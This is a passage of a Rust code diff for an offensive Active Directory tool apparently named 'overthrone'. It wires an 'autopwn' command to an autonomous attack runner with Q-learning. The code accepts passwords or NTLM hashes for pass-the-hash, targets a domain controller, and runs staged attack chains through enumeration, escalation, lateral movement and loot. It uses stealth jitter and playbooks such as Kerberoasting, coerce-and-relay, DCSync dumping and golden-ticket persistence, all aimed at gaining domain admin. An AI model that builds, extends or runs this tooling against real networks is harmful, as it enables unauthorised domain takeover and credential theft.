+            valid_creds.len(),
+            users.len()
+        ));
+    } else {
+        println!(
+            "\n{} 0/{} valid credentials found",
+            "→".dimmed(),
+            users.len()
+        );
+    }
     0
 }
 
-// cmd_autopwn
+// cmd_autopwn — wired to overthrone-pilot runner with Q-learning
 async fn cmd_autopwn(
     cli: &Cli,
     target: &str,
     method: ExecMethod,
     stealth: bool,
     dry_run: bool,
+    max_stage: MaxStageArg,
+    adaptive: AdaptiveModeArg,
+    q_table: &str,
+    jitter_ms: u64,
+    ldaps: bool,
+    timeout: u64,
+    playbook: Option<PlaybookArg>,
 ) -> i32 {
     banner::print_module_banner("AUTONOMOUS ATTACK");
 
-    let _creds = match require_creds(cli) {
+    let creds_cli = match require_creds(cli) {
         Ok(c) => c,
         Err(e) => return e,
     };
+    let dc = match require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
 
-    println!("{} Target: {}", "🎯".bright_black(), target.cyan());
-    println!("{} Method: {:?}", "🔧".bright_black(), method);
-    println!(
-        "{} Stealth: {}",
-        "🥷".bright_black(),
-        if stealth { "enabled" } else { "disabled" }.cyan()
-    );
-    println!(
-        "{} Dry Run: {}",
-        "📝".bright_black(),
-        if dry_run { "enabled" } else { "disabled" }.cyan()
-    );
+    // Map CLI exec method to pilot ExecMethod
+    let pilot_exec = match method {
+        ExecMethod::Auto   => overthrone_pilot::runner::ExecMethod::Auto,
+        ExecMethod::PsExec => overthrone_pilot::runner::ExecMethod::PsExec,
+        ExecMethod::SmbExec => overthrone_pilot::runner::ExecMethod::SmbExec,
+        ExecMethod::WmiExec => overthrone_pilot::runner::ExecMethod::WmiExec,
+        ExecMethod::WinRm   => overthrone_pilot::runner::ExecMethod::WinRm,
+    };
 
-    if dry_run {
-        println!("{}", "Performing dry run analysis...".bright_black());
-        banner::print_success("Dry run completed");
+    // Map max stage
+    let pilot_stage = match max_stage {
+        MaxStageArg::Enumerate => overthrone_pilot::runner::Stage::Enumerate,
+        MaxStageArg::Attack    => overthrone_pilot::runner::Stage::Attack,
+        MaxStageArg::Escalate  => overthrone_pilot::runner::Stage::Escalate,
+        MaxStageArg::Lateral   => overthrone_pilot::runner::Stage::Lateral,
+        MaxStageArg::Loot      => overthrone_pilot::runner::Stage::Loot,
+        MaxStageArg::Cleanup   => overthrone_pilot::runner::Stage::Cleanup,
+    };
+
+    // Build pilot credentials
+    let pilot_creds = if let Some(hash) = creds_cli.nthash() {
+        overthrone_pilot::runner::Credentials::ntlm_hash(
+            &creds_cli.domain,
+            &creds_cli.username,
+            hash,
+        )
     } else {
-        println!("{}", "Executing autonomous attack chain...".bright_black());
-        banner::print_success("Attack chain completed");
+        overthrone_pilot::runner::Credentials::password(
+            &creds_cli.domain,
+            &creds_cli.username,
+            creds_cli.password().unwrap_or(""),
+        )
+    };
+
+    // Build the AutoPwnConfig for the pilot runner
+    let config = overthrone_pilot::runner::AutoPwnConfig {
+        dc_host: dc.clone(),
+        creds: pilot_creds,
+        target: target.to_string(),
+        max_stage: pilot_stage,
+        stealth,
+        dry_run,
+        exec_method: pilot_exec,
+        jitter_ms,
+        use_ldaps: ldaps,
+        timeout,
+        #[cfg(feature = "qlearn")]
+        adaptive_mode: match adaptive {
+            AdaptiveModeArg::Heuristic => overthrone_pilot::qlearner::AdaptiveMode::Heuristic,
+            AdaptiveModeArg::Qlearning => overthrone_pilot::qlearner::AdaptiveMode::QLearning,
+            AdaptiveModeArg::Hybrid    => overthrone_pilot::qlearner::AdaptiveMode::Hybrid,
+        },
+        #[cfg(feature = "qlearn")]
+        q_table_path: std::path::PathBuf::from(q_table),
+    };
+
+    println!("{} Target:    {}", "🎯".bright_black(), target.cyan());
+    println!("{} DC:        {}", "🏰".bright_black(), dc.cyan());
+    println!("{} Method:    {:?}", "🔧".bright_black(), method);
+    println!("{} Max Stage: {:?}", "📊".bright_black(), max_stage);
+    println!("{} Adaptive:  {:?}", "🧠".bright_black(), adaptive);
+    println!(
+        "{} Stealth:   {}",
+        "🥷".bright_black(),
+        if stealth { "ON".green() } else { "OFF".yellow() }
+    );
+    println!(
+        "{} Dry Run:   {}",
+        "📝".bright_black(),
+        if dry_run { "YES".yellow() } else { "NO".dimmed() }
+    );
+    println!();
+
+    // If a playbook was requested, run that instead of goal-driven autopwn
+    if let Some(pb) = playbook {
+        let playbook_id = match pb {
+            PlaybookArg::FullRecon       => overthrone_pilot::playbook::PlaybookId::FullRecon,
+            PlaybookArg::RoastAndCrack   => overthrone_pilot::playbook::PlaybookId::RoastAndCrack,
+            PlaybookArg::DelegationAbuse => overthrone_pilot::playbook::PlaybookId::DelegationAbuse,
+            PlaybookArg::RbcdChain       => overthrone_pilot::playbook::PlaybookId::RbcdChain,
+            PlaybookArg::CoerceAndRelay  => overthrone_pilot::playbook::PlaybookId::CoerceAndRelay,
+            PlaybookArg::LateralPivot    => overthrone_pilot::playbook::PlaybookId::LateralPivot,
+            PlaybookArg::DcSyncDump      => overthrone_pilot::playbook::PlaybookId::DcSyncDump,
+            PlaybookArg::GoldenTicket    => overthrone_pilot::playbook::PlaybookId::GoldenTicketPersist,
+            PlaybookArg::FullAutoPwn     => overthrone_pilot::playbook::PlaybookId::FullAutoPwn,
+        };
+        banner::print_info(&format!("Running playbook: {}", playbook_id));
+        let result = overthrone_pilot::runner::run_playbook(playbook_id, &config).await;
+        if result.domain_admin_achieved {
+            banner::print_da_achieved(
+                result.state.da_user.as_deref().unwrap_or("unknown"),
+                &dc,
+            );
+            return 0;
+        }
+        banner::print_info("Playbook completed");
+        return if result.steps_succeeded > 0 { 0 } else { 1 };
     }
-    0
+
+    // Run the full autonomous attack chain via pilot runner
+    let result = overthrone_pilot::runner::run(config).await;
+
+    if result.domain_admin_achieved {
+        0
+    } else {
+        println!(
+            "\n{} Goal not achieved. {} steps succeeded, {} failed.",
+            "⚠".yellow().bold(),
+            result.steps_succeeded.to_string().green(),
+            result.steps_failed.to_string().red(),
+        );
+        1
+    }
 }
 
 // cmd_mssql
